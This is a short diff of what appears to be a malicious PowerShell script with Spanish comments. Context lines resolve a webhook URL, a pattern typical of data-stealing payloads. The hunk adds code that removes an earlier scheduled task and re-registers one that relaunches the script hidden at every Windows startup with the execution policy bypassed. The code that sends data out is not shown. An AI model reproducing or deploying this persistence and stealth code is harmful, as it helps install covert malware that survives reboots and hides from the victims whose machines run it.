@@ -8,6 +8,12 @@ if ($hookurl.Length -ne 121) {
     $hookurl = (irm $hookurl).url
 }
 
+# Eliminar la tarea programada anterior si existe
+$existingTask = Get-ScheduledTask -TaskName "ScriptStartupTask" -ErrorAction SilentlyContinue
+if ($existingTask) {
+    Unregister-ScheduledTask -TaskName "ScriptStartupTask" -Confirm:$false
+}
+
 # Crear la tarea programada para iniciar el script al iniciar Windows
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
